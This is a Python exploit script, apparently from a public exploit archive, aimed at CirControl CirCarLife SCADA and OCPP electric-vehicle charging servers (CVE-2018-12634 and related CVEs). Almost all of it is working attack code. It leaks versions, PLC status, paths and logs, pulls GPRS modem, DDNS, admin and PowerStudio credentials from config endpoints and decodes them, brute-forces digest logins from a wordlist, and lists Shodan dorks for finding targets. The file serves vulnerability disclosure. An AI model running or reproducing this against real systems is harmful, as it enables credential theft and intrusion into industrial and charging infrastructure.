# Exploit Author: David Castro
# Vendor Homepage: https://circontrol.com/
# Shodan Dork: Server: CirCarLife Server: PsiOcppApp
# Version: CirCarLife Scada all versions under 4.3.0 OCPP implementation all versions under 1.5.0
# CVE : CVE-2018-12634
 
&#039;&#039;&#039;
Description: Mutiple information disclosure issues, including admin credentials disclosure
&#039;&#039;&#039;
 
import requests
from requests.auth import HTTPDigestAuth
from termcolor import colored
from bs4 import BeautifulSoup
import xml.etree.ElementTree as ET
import re
import json
import base64 
 
cabecera = &#039;&#039;&#039;
                              _.-="_-         _
                         _.-="   _-          | ||"""""""---._______     __..
             ___.===""""-.______-,,,,,,,,,,,,`-&#039;&#039;----" """""       """""  __&#039;
      __.--""     __        ,&#039;     CIR-PWN-LIFE  o \            __        [__|
 __-""=======.--""  ""--.=================================.--""  ""--.=======:
]       [w] : /        \ : |========================|    : /        \ :  [w] :
V___________:| SadFud75 |: |========================|    :|          |:   _-"
 V__________: \        / :_|=======================/_____: \        / :__-"
 -----------&#039;  "-____-"  `-------------------------------&#039;  "-____-"
 
&#039;&#039;&#039;
 
print colored(cabecera, &#039;white&#039;)
print colored(&#039;[*] POC for automated exploitation for CirControl SCADA systems (circarlife and OCPP (Open Charge Point Protocol))&#039;, &#039;blue&#039;)
print colored(&#039;[?] Vendor site: https://circontrol.com/&#039;, &#039;yellow&#039;)
print colored(&#039;[*] CVEs associated: &#039;, &#039;blue&#039;) 
print colored(&#039;CVE-2018-12634, CVE-2018-16668, CVE-2018-16669, CVE-2018-16670, CVE-2018-16671, CVE-2018-16672&#039;, &#039;yellow&#039;)
print colored(&#039;[*] CirCarLife Scada versions affected: &#039;, &#039;blue&#039;) 
print colored(&#039;[+] All versions are vulnerable. No patch available, last version 4.3.0 (09/09/2018)&#039;, &#039;green&#039;)
print colored(&#039;[*] PsiOcppApp (PowerStudio integration Open Charge Point Protocol Application) versions affected: &#039;, &#039;blue&#039;) 
print colored(&#039;[+] All versions are vulnerable. No patch available, last version 1.5.0 (09/09/2018)&#039;, &#039;green&#039;)
print colored(&#039;[*] Shodan dorks: &#039;, &#039;blue&#039;)
print colored(&#039;[+] Server: CirCarLife&#039;, &#039;green&#039;)
print colored(&#039;[+] Server: PsiOcppApp&#039;, &#039;green&#039;)
print colored(&#039;[?] More vulnerability POCs at https://github.com/SadFud/Exploits&#039;, &#039;yellow&#039;)
 
plcs = []
logutil = [&#039;GPRS modem details&#039;]
autenticado = False
 
arr_versionessoft = []
arr_ldevstat = []
str_repository = &#039;&#039;
str_lversioneshard = &#039;&#039;
arr_logdetails = []
str_lsetup = &#039;&#039;
str_lconfig = &#039;&#039;
 
def lversionessoft(): 
    print colored(&#039;[*] Getting software versions via CVE-2018-16671&#039;, &#039;blue&#039;)
    leakv = requests.get(target1 + &#039;/html/device-id&#039;)
    versiones = leakv.text.encode("utf8").split(&#039;\n&#039;)
    print colored(&#039;[+] Software versions collected succesfully&#039;, &#039;green&#039;)
    return versiones
 
def ldevstat(): 
    print colored(&#039;[*] Getting plc status via CVE-2018-16670&#039;, &#039;blue&#039;)
    leakstats = requests.get(target1 + &#039;/services/user/values.xml?var=STATUS&#039;)
    statsraw = leakstats.text
    tree = ET.fromstring(statsraw)
    for i in range(0,len(tree.findall(".//variable"))):
        for j in range(0,2):
            plcs.append(tree[i][j].text)
    print colored(&#039;[+] information leaked from &#039; + str(len(plcs)/2) + &#039; plcs&#039;, &#039;green&#039;)
    return plcs
 
def plcstatus(code): 
    code = int(code)
    if code == 1:
        print colored(&#039;[+] OK&#039;, &#039;green&#039;)
    elif code == 2:
        if code == 0x10:
            if code == 0x20:
                print colored(&#039;[-] Error: Time out.&#039;, &#039;red&#039;)
            elif code == 0x40:
                print colored(&#039;[-] Error: Bad device.&#039;, &#039;red&#039;)
            elif code == 0x80:
                print colored(&#039;[-] Error: Bad phase.&#039;, &#039;red&#039;)
            elif code == 0x100:
                print colored(&#039;[-] Error: Bad version.&#039;, &#039;red&#039;)
        else:
            print colored(&#039;[-] Error: Unknown error.&#039;, &#039;red&#039;)
    elif code == 4:
        print colored(&#039;[-] Error: not initialized.&#039;, &#039;red&#039;)
    else:
        print colored(&#039;[?] Unknown code.&#039;, &#039;yellow&#039;)
 
def repository(): 
    print colored(&#039;[*] Getting installation paths via CVE-2018-16668&#039;, &#039;blue&#039;)
    path = requests.get(target1 + &#039;/html/repository&#039;)
    rutas = path.text.encode("utf8").split(&#039;\n&#039;)
    platformpath = rutas[1].split(&#039; &#039;)
    platformpath = platformpath[0]
    appsrc = rutas[3]
    appsrc = rutas[3].split(&#039; &#039;)
    appsrc = appsrc[0]
    raiz = str(appsrc).find(&#039;/circarlife/&#039;)
    appsrc = appsrc[0:raiz+len(&#039;/circarlife/&#039;)]
    print colored(&#039;[+] Platform installation path retrieved succesfully&#039;, &#039;green&#039;)  
    return &#039;Platform installation path: &#039; + platformpath + &#039;\n[+] Applicaction installation path: &#039; + appsrc
     
def lversioneshard(): 
    print colored(&#039;[*] Getting powerstudio driver versions via CVE-2018-12634&#039;, &#039;blue&#039;)
    basura = [&#039;/li&#039;, &#039;<&#039;, &#039;body&#039;, &#039;html&#039;, &#039;>&#039;, &#039;/ul&#039;, &#039;/&#039;]
    hardleak = requests.get(target1 + &#039;/services/system/info.html&#039;)
    hardleak = hardleak.text.encode("utf8").replace(&#039;<br />&#039;, &#039;\n&#039;)
    hardleak = hardleak.replace(&#039;<li>&#039;, &#039;\n&#039;)
    for caca in basura:
        hardleak = hardleak.replace(caca, &#039;&#039;)
    print colored(&#039;[+] Powerstudio driver versions leaked succesfully&#039;, &#039;green&#039;)
    return hardleak
 
def logdetails():
    print colored(&#039;[*] Leaking sensitive information via CVE-2018-12634&#039;, &#039;blue&#039;)
    log = requests.get(target1 + &#039;/html/log&#039;)
    log = log.text.encode("utf8")
    print colored(&#039;[*] Searching for modem id&#039;, &#039;blue&#039;)
    posmid = log.rfind(&#039;/modem-start: modem id: &#039;)
    logarr = log.split(&#039;\n&#039;)    
    if posmid != -1:
        logutil.append(&#039;Modem model:&#039;)
        print colored(&#039;[*] Modem id located&#039;, &#039;blue&#039;)
        for linea in logarr:
            if &#039;/modem-start: modem id: &#039; in linea:
                print colored(&#039;[+] Modem id leaked&#039;, &#039;green&#039;)            
                linea = linea.split(&#039; &#039;)
                logutil.append(linea[9])
    else:
        print colored(&#039;[-] Modem id not found&#039;, &#039;red&#039;)
    print colored(&#039;[*] Searching for GPRS modem credentials&#039;, &#039;blue&#039;)
    poslogin = log.rfind(&#039;Greetings!!&#039;)
    if poslogin != -1:
        print colored(&#039;[*] Credentials found&#039;, &#039;blue&#039;)
        logutil.append(&#039;Modem credentials&#039;)
        print colored(&#039;[+] GPRS modem credentials retrieved&#039;, &#039;green&#039;)
        for linea in logarr:
            if &#039;password=\"&#039; in linea:
                linea = linea.split(&#039; &#039;)
                logutil.append(linea[11])
                logutil.append(linea[12])
    else:
        print colored(&#039;[-] GPRS modem credentials not found with CVE-2018-12634&#039;, &#039;red&#039;)
    return logutil
 
def lsetup(user, pwd): 
    print colored(&#039;[*] Exploiting CVE-2018-16672 to leak information&#039;, &#039;blue&#039;)
    r1 = requests.get(target1 + &#039;/services/system/setup.json&#039;, auth=HTTPDigestAuth(user, pwd))
    if r1.text.encode("utf8").find(&#039;not granted&#039;) != -1:
        print colored(&#039;[-] Error, login failed&#039;, &#039;red&#039;)
    else:
        respuesta = r1.text.encode("utf8")
        print colored(&#039;[+] Setup information leaked&#039;)
        return respuesta
 
def lbrute():
    global luser80
    global lpasswd80
    global luser8080
    global lpasswd8080
    dicc = raw_input(&#039;Enter dictionary file with extension[format[user:password]]: &#039;)
    listado = open(dicc, "r")
    data = listado.readlines() 
    print colored(&#039;[*] Starting bruteforce...&#039;, &#039;blue&#039;)
    for linea in data:
        linea = linea.split(&#039;:&#039;)
        user = linea[0]
        pwd = linea[1]
        r1 = requests.get(target1 + &#039;/services/system/setup.json&#039;, auth=HTTPDigestAuth(user.strip(), pwd.strip()))
        r2 = requests.get(target2 + &#039;/services/config/config.xml&#039;, auth=HTTPDigestAuth(user.strip(), pwd.strip()))
        if r1.text.encode("utf8").find(&#039;not granted&#039;) != -1:
            print colored(&#039;[-] Error, login failed on port 80 with &#039; + user + &#039;:&#039; + pwd, &#039;red&#039;)
        else:
            print colored(&#039;[+] Valid credentials found on port 80: &#039; + user + &#039;:&#039; + pwd, &#039;green&#039;)
            luser80 = user
            lpasswd80 = pwd
        if r2.text.encode("utf8").find(&#039;Acess not granted&#039;) != -1:
            print colored(&#039;[-] Error, login failed on port 8080 with &#039; + user + &#039;:&#039; + pwd, &#039;red&#039;)
        else:
            print colored(&#039;[+] Valid credentials found on port 8080: &#039; + user + &#039;:&#039; + pwd, &#039;green&#039;)
            luser8080 = user
            lpasswd8080 = pwd
    listado.close()
 
def lconfig(user, pwd):
    print colored(&#039;[*] Leaking config file via CVE-2018-16669&#039;, &#039;blue&#039;)
    r2 = requests.get(target2 + &#039;/services/config/config.xml&#039;, auth=HTTPDigestAuth(user.strip(), pwd.strip()))
    if r2.text.encode("utf8").find(&#039;Acess not granted&#039;) != -1:
        print colored(&#039;[-] Error. Login failed&#039;, &#039;red&#039;)
    else:
        config = r2.text.encode(&#039;utf8&#039;)
        print colored(&#039;[+] Config file leaked succesfully&#039;, &#039;green&#039;)
        return config
 
def salida(versiones, plcs, ruta, hard, log, setup, config):
    print colored(&#039;[*] Parsing information and generating output.&#039;, &#039;blue&#039;)
    print colored(&#039;[*] Parsing software information&#039;, &#039;blue&#039;)
    print colored(&#039;[+] Device name: &#039;, &#039;green&#039;) + versiones[0]
    print colored(&#039;[+] Software_name: &#039;, &#039;green&#039;) + versiones[1]
    print colored(&#039;[+] Software_version: &#039;, &#039;green&#039;) + versiones[2] 
    print colored(&#039;[+] System time: &#039;, &#039;green&#039;) + versiones[3]
    print colored(&#039;[+] &#039;, &#039;green&#039;) + ruta
    print colored(&#039;[*] Parsing powerstudio driver versions&#039;, &#039;blue&#039;)
    hard = hard.replace(&#039;ul&#039;, &#039;&#039;)
    print colored(hard.strip(), &#039;green&#039;)
    print colored(&#039;[*] Parsing PLCs values&#039;, &#039;blue&#039;)
    for i in range(0,len(plcs)):
        if ((i % 2) != 0):
            codigo = plcs[i].split(&#039;.&#039;)
            plcstatus(codigo[0])
        else:
            nombre = plcs[i].replace(&#039;.STATUS&#039;, &#039;&#039;)
            print colored(&#039;[+] PLC name: &#039; + nombre, &#039;green&#039;)
    print colored(&#039;[*] Parsing leaked data from logs using CVE-2018-12634&#039;, &#039;blue&#039;)
    if len(log) > 3:
        print colored(&#039;[*] &#039; + log[0], &#039;blue&#039;)
        for i in range(2,len(log)):
            if log[i] != &#039;Modem credentials&#039;:
                print colored(&#039;[+] GPRS router model found: &#039;, &#039;green&#039;) + log[i]
                break
        for i in range(0,len(log)):
            if log[i] == &#039;Modem credentials&#039;:
                creds = i
                break
 
        for i in range(creds + 1, len(log)):
            if (log[i].rfind(&#039;user=&#039;)) != -1:
                usuario = log[i].split(&#039;=&#039;)
                user = usuario[1]
                user = user.replace(&#039;\"&#039;, &#039;&#039;)
            if (log[i].rfind(&#039;password=&#039;)) != -1:
                cont = log[i].split(&#039;=&#039;)
                contrase = cont[1]
                contrase = contrase.replace(&#039;\"&#039;, &#039;&#039;)
                contrase = contrase.replace(&#039;]&#039;, &#039;&#039;)
                break
        print colored(&#039;[+] Username and password for GPRS modem found: &#039;, &#039;green&#039;) + user + &#039;:&#039; + contrase
    else:
        colored(&#039;[?] No data was extracted from logs using CVE-2018-12634&#039;, &#039;yellow&#039;)
    print colored(&#039;[*] Parsing setup file&#039;, &#039;blue&#039;)
    if (len(str(setup)) > 5):
        datos = json.loads(setup)
        print colored(&#039;[*] Processing device configuration data: &#039;, &#039;blue&#039;)
        print colored(&#039;[+] MAC Address: &#039;, &#039;green&#039;) + datos["device"]["mac"]
        print colored(&#039;[+] IMEI: &#039;, &#039;green&#039;) + datos["device"]["imei"]
        print colored(&#039;[+] ICCID: &#039;, &#039;green&#039;) + datos["device"]["iccid"]
        print colored(&#039;[+] IMSI: &#039;, &#039;green&#039;) + datos["device"]["imsi"]
        print colored(&#039;[*] Processing network configuration data: &#039;, &#039;blue&#039;)
        print colored(&#039;[+] Hostname: &#039;, &#039;green&#039;) + datos["network"]["hostname"]
        print colored(&#039;[+] ClientId: &#039;, &#039;green&#039;) + datos["network"]["clientid"]
        print colored(&#039;[+] IP address: &#039;, &#039;green&#039;) + datos["network"]["ip"]
        print colored(&#039;[+] Netmask: &#039;, &#039;green&#039;) + datos["network"]["netmask"]
        print colored(&#039;[+] Gateway: &#039;, &#039;green&#039;) + datos["network"]["gateway"]
        print colored(&#039;[+] Name server 0: &#039;, &#039;green&#039;) + datos["network"]["nameserver0"]
        print colored(&#039;[+] Name server 1: &#039;, &#039;green&#039;) + datos["network"]["nameserver1"]
        print colored(&#039;[*] Processing locale options configuration data&#039;, &#039;blue&#039;)
        print colored(&#039;[+] Language: &#039;, &#039;green&#039;) + datos["locale"]["language"]
        print colored(&#039;[+] Currency: &#039;, &#039;green&#039;) + datos["locale"]["currency"]
        print colored(&#039;[*] Processing public address configuration data&#039;, &#039;blue&#039;)
        print colored(&#039;[+] Host type: &#039;, &#039;green&#039;) + datos["paddress"]["hosttype"]
        print colored(&#039;[+] Host: &#039;, &#039;green&#039;) + datos["paddress"]["host"]
        print colored(&#039;[*] Processing time configuration data&#039;, &#039;blue&#039;)
        print colored(&#039;[+] NTP Server 0: &#039;, &#039;green&#039;) + datos["time"]["ntpserver0"]
        print colored(&#039;[+] NTP server 1: &#039;, &#039;green&#039;) + datos["time"]["ntpserver1"]
        print colored(&#039;[+] Timezone: &#039;, &#039;green&#039;) + datos["time"]["timezone"]
        print colored(&#039;[*] Processing GPRS modem configuration data&#039;, &#039;blue&#039;)
        print colored(&#039;[+] Acess point name: &#039;, &#039;green&#039;) + datos["modem"]["apn"]
        print colored(&#039;[+] Username: &#039;, &#039;green&#039;) + datos["modem"]["usr"]
        print colored(&#039;[+] Password: &#039;, &#039;green&#039;) + datos["modem"]["pwd"]
        print colored(&#039;[+] Reset: &#039;, &#039;green&#039;) + str(datos["modem"]["reset"])
        print colored(&#039;[+] Ping Ip: &#039;, &#039;green&#039;) + str(datos["modem"]["pingip"])
        print colored(&#039;[+] Ping period: &#039;, &#039;green&#039;) + str(datos["modem"]["pingperiod"])
        print colored(&#039;[+] Ping auto reset: &#039;, &#039;green&#039;) + str(datos["modem"]["pingautoreset"])
        print colored(&#039;[*] Processing DDNS configuration data&#039;, &#039;blue&#039;)
        print colored(&#039;[+] DDNS server: &#039;, &#039;green&#039;) + datos["ddns"]["server"]
        print colored(&#039;[+] DDNS host: &#039;, &#039;green&#039;) + datos["ddns"]["host"]
        print colored(&#039;[+] DDNS Username: &#039;, &#039;green&#039;) + datos["ddns"]["usr"]
        print colored(&#039;[+] DDNS password: &#039;, &#039;green&#039;) + datos["ddns"]["pwd"]
        print colored(&#039;[*] Processing security configuration data&#039;, &#039;blue&#039;)
        print colored(&#039;[+] Username: &#039;, &#039;green&#039;) + datos["security"]["user"]
        print colored(&#039;[+] Password: &#039;, &#039;green&#039;) + str(datos["security"]["passwd"])
        print colored(&#039;[*] Processing services configuration data&#039;, &#039;blue&#039;)
        print colored(&#039;[+] iManager&#039;, &#039;green&#039;) + str(datos["services"]["imanager"])
        print colored(&#039;[+] Active-Integration: &#039;, &#039;green&#039;) + str(datos["services"]["activeIntegration"])
        print colored(&#039;[+] Web Editor: &#039;, &#039;green&#039;) + str(datos["services"]["webeditor"])
        print colored(&#039;[+] SCADA Applet: &#039;, &#039;green&#039;) + str(datos["services"]["appletscada"])
        print colored(&#039;[+] Html5: &#039;, &#039;green&#039;) + str(datos["services"]["html5"])
        print colored(&#039;[*] Parsing Open Charge Point Protocol configuration file&#039;, &#039;blue&#039;)
    else:
        print colored(&#039;[-] Unable to retrieve the setup config file&#039;, &#039;red&#039;)
    if (len(str(config)) > 10):
        tree = ET.fromstring(config)
        print colored(&#039;[*] Processing management system CS settings&#039;, &#039;blue&#039;)
        print colored(&#039;[+] End point: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//csEndPoint&#039;).text)
        print colored(&#039;[+] Username: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//csUser&#039;).text)
        print colored(&#039;[+] Password: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//csPassword&#039;).text)
        print colored(&#039;[+] Litle endian: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//isLitleEndian&#039;).text)
        print colored(&#039;[*] Processing Charge Box settings file&#039;, &#039;blue&#039;)
        print colored(&#039;[+] Charge box Protocol: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbProtocol&#039;).text)
        print colored(&#039;[+] Charge box certificate: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbRequireCsClientCertificate&#039;).text)
        print colored(&#039;[+] Charge box ID: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbId&#039;).text)
        print colored(&#039;[+] Charge box Username: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbUser&#039;).text)
        print colored(&#039;[+] Charge box password: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbPassword&#039;).text)
        print colored(&#039;[+] Charge box OCPP internal port: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbOcppPortInternal&#039;).text)
        print colored(&#039;[+] Charge box OCPP public port: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbOcppPortPublic&#039;).text)
        print colored(&#039;[+] Charge box use whitelist: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbUseWl&#039;).text)
        print colored(&#039;[+] Charge box whitelist first: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbWlFirst&#039;).text)
        print colored(&#039;[+] Charge box offline authentication: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbAuthOffline&#039;).text)
        print colored(&#039;[+] Charge box internal error retry delay: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbRetryInternalErr&#039;).text)
        print colored(&#039;[+] Charge box use OCPP T-Sync: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbUseOcppTSync&#039;).text)
        print colored(&#039;[+] Charge box use aprtial energy: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbUsePartialEnergy&#039;).text)
        #print colored(&#039;[+] Charge box use partial energy meter value: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbUsePartialEnergyMeterVal&#039;).text)
        print colored(&#039;[+] Charge box stop if unauthenticated: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbStopIfUnauth&#039;).text)
        print colored(&#039;[+] Charge box stop if concurrent tx: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbStopIfConcurrentTx&#039;).text)
        print colored(&#039;[+] Charge box hearth-beat interval: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbHbInterval&#039;).text)
        print colored(&#039;[+] Charge box connection time out interval: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbConnTimeOut&#039;).text)
        print colored(&#039;[+] Charge box meter interval: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbMeterInterval&#039;).text)
        #print colored(&#039;[+] Charge box public Ip timeout interval: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbPublicIpTimeOut&#039;).text)
        #print colored(&#039;[+] Charge box authentication required for remote start: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbRequireAuthRemoteStart&#039;).text)
        #print colored(&#039;[+] Charge box meter requires power: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//cbMeterValRequiresPower&#039;).text)
        print colored(&#039;[*] Processing Powerstudio engine settings file&#039; , &#039;blue&#039;)
        print colored(&#039;[+] Powerstudio engine host: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//pwStdHost&#039;).text)
        print colored(&#039;[+] Powerstudio engine port: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//pwStdPort&#039;).text)
        print colored(&#039;[+] Powerstudio engine username: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//pwStdUser&#039;).text)
        print colored(&#039;[+] Powerstudio engine password: &#039;, &#039;green&#039;) + base64.b64decode(str(tree.find(&#039;.//pwStdPassword&#039;).text))
        print colored(&#039;[+] Powerstudio engine username (with edit permissions): &#039;, &#039;green&#039;) + str(tree.find(&#039;.//pwStdUserEdit&#039;).text)
        print colored(&#039;[+] Powerstudio engine password (with edit permissions): &#039;, &#039;green&#039;) + base64.b64decode(str(tree.find(&#039;.//pwStdPasswordEdit&#039;).text))
        print colored(&#039;[*] Processing powerstudio application parameters&#039;, &#039;blue&#039;)
        print colored(&#039;[+] Powerstudio application port: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//pssPort&#039;).text)
        print colored(&#039;[+] Powerstudio application admin: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//pssAdminUser&#039;).text)
        print colored(&#039;[+] Powerstudio application password: &#039;, &#039;green&#039;) + base64.b64decode(str(tree.find(&#039;.//pssAdminPassword&#039;).text))
        print colored(&#039;[+] Powerstudio application debug logging level: &#039;, &#039;green&#039;) + str(tree.find(&#039;.//pssLoglevel&#039;).text)
    else:
        print colored(&#039;[-] Unable to retrieve the OCPP config file&#039;, &#039;red&#039;)
 
#entrypoint
url = raw_input(&#039;Insert target ip: &#039;)
target1 = &#039;http://&#039; + url 
target2 = &#039;http://&#039; + url + &#039;:8080&#039;
luser80 = &#039;admin&#039;
lpasswd80 = &#039;1234&#039;
luser8080 = &#039;admin&#039;
lpasswd8080 = &#039;1234&#039;
luser80 = raw_input(&#039;Insert username for login at circarlife server: (b to bruteforce)&#039;)
if (luser80 == &#039;b&#039;):
    lbrute()
else:    
    lpasswd80 = raw_input(&#039;Insert password for login at circarlife server: &#039;)
    luser8080 = raw_input(&#039;Insert username for login at OCPP server: &#039;)
    lpasswd8080 = raw_input(&#039;Insert password for login at OCPP server: &#039;)
 
versiones = lversionessoft()   
plcs = ldevstat()
ruta = repository()
hard = lversioneshard()
log = logdetails()
setup = lsetup(luser80.strip(), lpasswd80.strip())
config = lconfig(luser8080.strip(), lpasswd8080.strip())
salida(versiones, plcs, ruta, hard, log, setup, config)

